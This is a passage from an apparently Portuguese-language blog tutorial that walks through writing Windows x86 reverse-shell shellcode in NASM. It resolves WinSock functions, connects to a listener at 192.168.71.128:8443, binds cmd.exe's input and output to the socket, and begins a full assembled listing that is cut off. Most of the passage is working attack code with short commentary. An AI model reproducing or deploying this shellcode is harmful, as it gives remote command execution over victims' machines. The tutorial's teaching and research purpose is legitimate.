</pre></table></code></div></div><p>Ela também precisa de um ponteiro para <code class="language-plaintext highlighter-rouge">WSADATA</code>, pois a <code class="language-plaintext highlighter-rouge">WSAStartup()</code> retorna um ponteiro para esta estrutura, portanto, precisamos alocar certo espaço para ela.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nl">WSAStartupCall:</span>

	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;zerando registrador</span>
	<span class="nf">mov</span> <span class="nb">dx</span><span class="p">,</span> <span class="mh">0x190</span>   <span class="c1">;preparando espaço para WSADATA</span>
	<span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;alocando o espaço para WSADATA</span>
	<span class="nf">push</span> <span class="nb">esp</span>        <span class="c1">;movendo ponteiro para este espaço</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;enviando o parametro wVersionRequested para stack</span>
	<span class="nf">call</span> <span class="nb">eax</span>        <span class="c1">;chamando WSAStartup(MAKEWORD(2, 2), wsadata_pointer)</span>
</pre></table></code></div></div><p>Conforme vimos antes, quando esta função é executada com sucesso, ela retorna zero no registrador <code class="language-plaintext highlighter-rouge">EAX</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240722210848.png" alt="" /></p><p>A próxima função a ser encontrada, é a <code class="language-plaintext highlighter-rouge">WSASocketA()</code>, podendo seguir os mesmos passos.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nl">WSASocketA:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e4174</span>              <span class="c1">;movendo NNAt para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x656b636f</span>              <span class="c1">;movendo ekco para stack</span>
	<span class="nf">push</span> <span class="mh">0x53415357</span>              <span class="c1">;movendo SASW para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                     <span class="c1">;movendo ponteiro da ws2_32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                     <span class="c1">;chamando GetProcAddress("ws2_32.dll", "`WSASocketA")</span>
</pre></table></code></div></div><p>Neste ponto, temos o ponteiro para <code class="language-plaintext highlighter-rouge">WSASocketA()</code> em <code class="language-plaintext highlighter-rouge">EAX</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240722211239.png" alt="" /></p><p>Agora podemos montar a estrutura da função na <em>stack</em> e chamá-la.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nl">WSASocketACall:</span>

	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;zerando registrador</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;dwFlags=NULL</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;g=NULL</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;lpProtocolInfo=NULL</span>
	<span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x6</span>     <span class="c1">;edx==6</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;protocol=6</span>
	<span class="nf">sub</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x5</span>     <span class="c1">;edx==1</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;type=1</span>
	<span class="nf">inc</span> <span class="nb">edx</span>         <span class="c1">;edx==2</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;af=2</span>
	<span class="nf">call</span> <span class="nb">eax</span>        <span class="c1">;call WSASocketA</span>
	<span class="nf">push</span> <span class="nb">eax</span>        <span class="c1">;enviando retorno para stack</span>
	<span class="nf">pop</span> <span class="nb">edi</span>         <span class="c1">;salvando socket em edi</span>
</pre></table></code></div></div><p>A próxima função a ser encontrada é a <code class="language-plaintext highlighter-rouge">connect()</code> que fará a conexão com o <em>socket</em> do <em>listener</em>.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nl">Connect:</span>

	<span class="nf">push</span> <span class="mh">0x4e746365</span>            <span class="c1">;movendo Ntce para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span> <span class="c1">;removendo o "N"</span>
	<span class="nf">push</span> <span class="mh">0x6e6e6f63</span>            <span class="c1">;movendo nnoc para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                   <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                   <span class="c1">;movendo ponteiro da ws2_32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                   <span class="c1">;chamando GetProcAddress("ws2_32.dll", "connect")</span>
</pre></table></code></div></div><p>Neste ponto, o ponteiro para a função <code class="language-plaintext highlighter-rouge">connect()</code> está armazendo em <code class="language-plaintext highlighter-rouge">EAX</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240722213319.png" alt="" /></p><p>Para montar a função <code class="language-plaintext highlighter-rouge">connect()</code>, precisamos do <em>socket listener</em> que deve ser composto por IP e Porta, porém, estes valores devem estar em <em>little endian</em> e em hexadecimal. O IP de testes que utilizarei, é <strong>192.168.71.128</strong>, portanto, para convertê-lo de forma rápida no terminal, utilizei:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"0x%02X%02X%02X%02X</span><span class="se">\n</span><span class="s2">"</span> 128 71 168 192
0x8047A8C0
</pre></table></code></div></div><p>Porém, para evitar <em>bytes</em> nulos, faremos uma operação de adicionar <code class="language-plaintext highlighter-rouge">0x01010101</code> a este valor:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"0x%X</span><span class="se">\n</span><span class="s2">"</span> <span class="k">$((</span><span class="s2">"0x8047A8C0"</span> <span class="o">+</span> <span class="s2">"0x01010101"</span><span class="k">))</span>
0x8148A9C1
</pre></table></code></div></div><p>A porta que utilizarei, será <strong>8443</strong>, portanto:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"0x%X</span><span class="se">\n</span><span class="s2">"</span> 8443
0x20FB
</pre></table></code></div></div><p>Com isso podemos montar a estrutura da função na <em>stack</em>:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nl">ConnectCall:</span>

	 <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x8148A9C1</span>    <span class="c1">;movendo 192.168.71.128 + 0x01010101 para a stack</span>
	 <span class="nf">sub</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x01010101</span>    <span class="c1">;subtraindo 0x01010101</span>
	 <span class="nf">push</span> <span class="nb">edx</span>               <span class="c1">;movendo ponteiro da sin_addr para a stack</span>
	 <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0xFB20</span>       <span class="c1">;movendo porta 8443 = 0x20FB para a stack</span>
	 <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
	 <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">2</span>
	 <span class="nf">push</span> <span class="nb">dx</span>
	 <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
	 <span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x10</span>         <span class="c1">;limpando stack</span>
	 <span class="nf">push</span> <span class="nb">edx</span>               <span class="c1">;enviando ponteiro para sockaddr_in</span>
	 <span class="nf">push</span> <span class="nb">edi</span>               <span class="c1">;enviando ponteiro do socket</span>
	 <span class="nf">call</span> <span class="nb">eax</span>               <span class="c1">;chamando connect</span>
</pre></table></code></div></div><p>Agora, ao executar o programa no alvo, como <em>listener</em> aberto na máquina atacante, é possível perceber uma conexão recebida:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240722220449.png" alt="" /></p><p>Com o <em>socket</em> pronto, precisamos criar um processo que executará o <code class="language-plaintext highlighter-rouge">cmd.exe</code> (ou qualquer outro que quiser). Para isso, vamos encontrar o endereço da função <code class="language-plaintext highlighter-rouge">CreateProcessA()</code> que tem justamente a função de iniciar qualquer executável.</p><p>Agora eu <strong>recomendo fortemente</strong> que a <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">documentação da CreateProcessA</a> seja lida, pois esta é uma função de extrema importância na criação de <em>shellcodes</em> e <em>exploits</em>.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nl">CreateProcessA:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e4173</span>              <span class="c1">;movendo NNAs para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x7365636f</span>              <span class="c1">;movendo seco para stack</span>
	<span class="nf">push</span> <span class="mh">0x72506574</span>              <span class="c1">;movendo rPet para stack</span>
	<span class="nf">push</span> <span class="mh">0x61657243</span>              <span class="c1">;movendo aerC para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">ebx</span>                     <span class="c1">;movendo ponteiro da kernel32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                     <span class="c1">;chamando GetProcAddress("kernel32.dll", "CreateProcessA")</span>
	<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">ebx</span>                 <span class="c1">;salvando kernel32 em um novo ponteiro</span>
</pre></table></code></div></div><p>Agora temos a função <code class="language-plaintext highlighter-rouge">CreateProcessA()</code> no registrador <code class="language-plaintext highlighter-rouge">EAX</code> e o endereço da <code class="language-plaintext highlighter-rouge">kernel32.dll</code> salvo em <code class="language-plaintext highlighter-rouge">ESI</code>. Esta mudança ocorreu, pois para a criação do processo, precisaremos utilizar o registrador <code class="language-plaintext highlighter-rouge">EBX</code>, e ainda precisaremos do endereço base em um próximo passo.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240722221750.png" alt="" /></p><p>A função <code class="language-plaintext highlighter-rouge">CreateProcessA()</code> tem uma estrutura grande e exige bastante atenção em sua montagem em um <em>shellcode</em>. De acordo com a sua documentação, possui o seguinte formato:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="nf">CreateProcessA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPCSTR</span>                <span class="n">lpApplicationName</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPSTR</span>                 <span class="n">lpCommandLine</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpProcessAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">BOOL</span>                  <span class="n">bInheritHandles</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">DWORD</span>                 <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPVOID</span>                <span class="n">lpEnvironment</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPCSTR</span>                <span class="n">lpCurrentDirectory</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">LPSTARTUPINFOA</span>        <span class="n">lpStartupInfo</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span>               <span class="n">LPPROCESS_INFORMATION</span> <span class="n">lpProcessInformation</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Como pode ser visto, alguns argumentos são opcionais, porém, um em específico merece atenção: <code class="language-plaintext highlighter-rouge">LPSTARTUPINFOA</code>.</p><p>A estrutura <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa">STARTUPINFOA</a> contém uma série de argumentos que definem <strong>como</strong> o processo será executado na interface Windows. Por se tratar da execução de um <code class="language-plaintext highlighter-rouge">CMD</code>, nem todos os argumentos precisam ser inicializados, porém, <strong>todos</strong> precisam estar presentes na construção da estrutura, mesmo que sejam nulos.</p><p>A <code class="language-plaintext highlighter-rouge">STARTUPINFOA</code> tem o seguinte formato com 18 argumentos:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_STARTUPINFOA</span> <span class="p">{</span>
  <span class="n">DWORD</span>  <span class="n">cb</span><span class="p">;</span>
  <span class="n">LPSTR</span>  <span class="n">lpReserved</span><span class="p">;</span>
  <span class="n">LPSTR</span>  <span class="n">lpDesktop</span><span class="p">;</span>
  <span class="n">LPSTR</span>  <span class="n">lpTitle</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">dwX</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">dwY</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">dwXSize</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">dwYSize</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">dwXCountChars</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">dwYCountChars</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">dwFillAttribute</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">dwFlags</span><span class="p">;</span>
  <span class="n">WORD</span>   <span class="n">wShowWindow</span><span class="p">;</span>
  <span class="n">WORD</span>   <span class="n">cbReserved2</span><span class="p">;</span>
  <span class="n">LPBYTE</span> <span class="n">lpReserved2</span><span class="p">;</span>
  <span class="n">HANDLE</span> <span class="n">hStdInput</span><span class="p">;</span>
  <span class="n">HANDLE</span> <span class="n">hStdOutput</span><span class="p">;</span>
  <span class="n">HANDLE</span> <span class="n">hStdError</span><span class="p">;</span>
<span class="p">}</span> <span class="n">STARTUPINFOA</span><span class="p">,</span> <span class="o">*</span><span class="n">LPSTARTUPINFOA</span><span class="p">;</span>
</pre></table></code></div></div><p>Para fins de detalhe, as próximas partes do programa responsável por montar a estrutura da <code class="language-plaintext highlighter-rouge">CreateProcessA()</code> será dividido e comentado.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nl">cmd:</span>

	<span class="nf">push</span> <span class="mh">0x4e646d63</span>            <span class="c1">;movendo Ndmc para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span> <span class="c1">;removendo o "N"</span>
	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>               <span class="c1">;movendo ponteiro da string para a stack</span>
</pre></table></code></div></div><p>Neste ponto, preenchemos o argumento do processo a ser inicializado pela função <code class="language-plaintext highlighter-rouge">CreateProcessA()</code>. Agora precisamos preparar a estrutura da <code class="language-plaintext highlighter-rouge">STARTUPINFOA</code> na <em>stack</em>.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>	<span class="c1">;configurando a estrutura STARTUPINFO</span>
	<span class="nf">push</span> <span class="nb">edi</span>                   <span class="c1">;preenchendo o argumento hStdError com o socket</span>
	<span class="nf">push</span> <span class="nb">edi</span>                   <span class="c1">;preenchendo o argumento hStdOutput com o socket</span>
	<span class="nf">push</span> <span class="nb">edi</span>                   <span class="c1">;preenchendo o argumento hStdInput com o socket</span>
	<span class="nf">xor</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">edi</span>               <span class="c1">;limpando edi par usar com os NULLs que precisamos</span>
	<span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x12</span>             <span class="c1">;enviaremos 18 * 4 = 72 null bytes para stack (tamanho da estrutura da STARTUPINFOA)</span>
	<span class="nf">pop</span> <span class="nb">ecx</span>                    <span class="c1">;preparando ecx para o loop</span>

<span class="nl">looper:</span>

	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;enviando uma dword null para stack</span>
	<span class="nf">loop</span> <span class="nv">looper</span>                      <span class="c1">;fazendo o loop até enviar para stack os nulls suficientes</span>
</pre></table></code></div></div><p>Neste trecho, enviamos <code class="language-plaintext highlighter-rouge">EDI</code> três vezes para a <em>stack</em>, para enviar o <em>file descriptor</em> do nosso <em>socket</em> para os argumentos <code class="language-plaintext highlighter-rouge">hStdError</code>, <code class="language-plaintext highlighter-rouge">hStdOutput</code> e <code class="language-plaintext highlighter-rouge">hStdInput</code> da <code class="language-plaintext highlighter-rouge">STARTUPINFOA</code>.</p><p>Em seguida, enviamos <code class="language-plaintext highlighter-rouge">0x12 = 18</code> para a <em>stack</em> para ser vir de contador, assim podemos fazer o <em>loop</em> de NULLs, criando uma estrutura vazia para <code class="language-plaintext highlighter-rouge">STARTUPINFOA</code> que tem <strong>18</strong> argumentos (dos quais já preenchemos 3) e para a <code class="language-plaintext highlighter-rouge">PPROCESS_INFORMATION</code> que tem <strong>3</strong> argumentos. Isso faz com que <strong>nenhum</strong> argumento destas estruturas sejam inicializados nesse momento. Porém, existem argumentos que <strong>precisam</strong> ser inicializados.</p><p>Uma vez que a <em>stack</em> cresce inversamente, e já temos uma estrutura com 18 argumentos nulos, podemos preencher estes argumentos de forma <strong>retroativa</strong> referenciando seus endereços como <code class="language-plaintext highlighter-rouge">mov word [esp + offset], valor</code>. Portanto, inicializaremos os argumentos desta forma.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>	<span class="nf">mov</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">],</span> <span class="mh">0x0101</span>    <span class="c1">;configurando dwFlags para STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW</span>
	<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">],</span> <span class="mh">0x44</span>      <span class="c1">;configurando cb com o tamanho da estrutura 0x44 = 68 decimal</span>
	<span class="nf">lea</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>            <span class="c1">;configurando ecx como um ponteiro para a estrutura STARTUPINFO</span>
</pre></table></code></div></div><p>Estes argumentos são os que <strong>precisam</strong> ser inicializados na estrutura <code class="language-plaintext highlighter-rouge">STARTUPINFOA</code>. A estrutura <code class="language-plaintext highlighter-rouge">PPROCESS_INFORMATION</code> já está preenchida com nulos e pode ficar desta forma. O que temos neste momento é o registrador <code class="language-plaintext highlighter-rouge">ECX</code> apontando para a estrutura <code class="language-plaintext highlighter-rouge">STARTUPINFOA</code> já inicializada e <code class="language-plaintext highlighter-rouge">ESP</code> apontando para <code class="language-plaintext highlighter-rouge">PPROCESS_INFORMATION</code>.</p><p>Uma vez que as estruturas estão preenchidas, podemos agora, de fato, montar a função <code class="language-plaintext highlighter-rouge">CreateProcessA()</code> na <em>stack</em> e chamá-la:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>	<span class="c1">;montando e chamando CreateProcessA</span>
	<span class="nf">push</span> <span class="nb">esp</span>                         <span class="c1">;enviando ponteiro da PROCESS_INFORMATION para stack</span>
	<span class="nf">push</span> <span class="nb">ecx</span>                         <span class="c1">;enviando ponteiro da STARTUPINFOA para stack</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpCurrentDirectory será NULL então o processo inicializará no mesmo diretório do processo pai</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpEnvironment será NULL então o processo terá o mesmo ambiente do processo pai</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento dwCreationFlags será NULL</span>
	<span class="nf">inc</span> <span class="nb">edi</span>                          <span class="c1">;edi==1</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento bInheritHandles=TURE</span>
	<span class="nf">dec</span> <span class="nb">edi</span>                          <span class="c1">;edi==0</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpThreadAttributes será NULL</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpProcessAttributes será NULL</span>
	<span class="nf">push</span> <span class="nb">ebx</span>                         <span class="c1">;argumento lpCommandLine apontará para "cmd,0"</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpApplicationName será NULL</span>
	<span class="nf">call</span> <span class="nb">eax</span>                         <span class="c1">;chamando CreateProcessA</span>
</pre></table></code></div></div><p>Nesse ponto, o <em>reverse shell</em> está configurado, o ultimo detalhe a ser configurado é a chamada para <code class="language-plaintext highlighter-rouge">ExitProcess()</code> para o programa ser encerrado sem risco de <em>crash</em>. Uma vez que sabemos que esta função está dentro de <code class="language-plaintext highlighter-rouge">kernel32.dll</code> e seu argumento é zero, podemos encontrar seu endereço e chamá-la da seguinte forma:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nl">ExitProcess:</span>

	<span class="nf">push</span> <span class="mh">0x4e737365</span>            <span class="c1">;movendo Nsse para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span> <span class="c1">;removendo o "N"</span>
	<span class="nf">push</span> <span class="mh">0x636f7250</span>            <span class="c1">;movendo corP para stack</span>
	<span class="nf">push</span> <span class="mh">0x74697845</span>            <span class="c1">;movendo tixE para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                   <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                   <span class="c1">;movendo ponteiro da kernel32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                   <span class="c1">;chamando GetProcAddress("kernel32.dll", "ExitProcess")</span>

	<span class="c1">;chamando ExitProcess</span>
	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>               <span class="c1">;zerando registrador</span>
	<span class="nf">push</span> <span class="nb">ecx</span>                   <span class="c1">;enviando 0x00 para stack</span>
	<span class="nf">call</span> <span class="nb">eax</span>                   <span class="c1">;chamando ExitProcess</span>
</pre></table></code></div></div><p>Juntando todas as partes desenvolvidas, temos o seguinte <em>shellcode</em>:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

<span class="nl">getKernel32:</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">;zerando o registrador</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">fs</span><span class="p">:</span><span class="mh">0x30</span><span class="p">]</span>      <span class="c1">;movendo o offset da PEB de fs (File Segment) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x0c</span><span class="p">]</span>   <span class="c1">;movendo o offset da LDR (PEB + 0x00c) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>   <span class="c1">;movendo o offset da InMemoryOrderModuleList (LDR + 0x014) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do primeiro modulo - o executavel em si</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do segundo modulo - ntdll.dll</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>   <span class="c1">;carregando o endereço base do terceiro modulo - kernel32.dll</span>

<span class="nl">getProcAddress:</span>

    <span class="c1">;enviando nome da função para stack</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>                <span class="c1">;zerando o registrador</span>
    <span class="nf">push</span> <span class="mh">0x4e4e7373</span>             <span class="c1">;movendo NNss para stack</span>
    <span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
    <span class="nf">push</span> <span class="mh">0x65726464</span>             <span class="c1">;movendo erdd para stack</span>
    <span class="nf">push</span> <span class="mh">0x41636f72</span>             <span class="c1">;movendo Acor para stack</span>
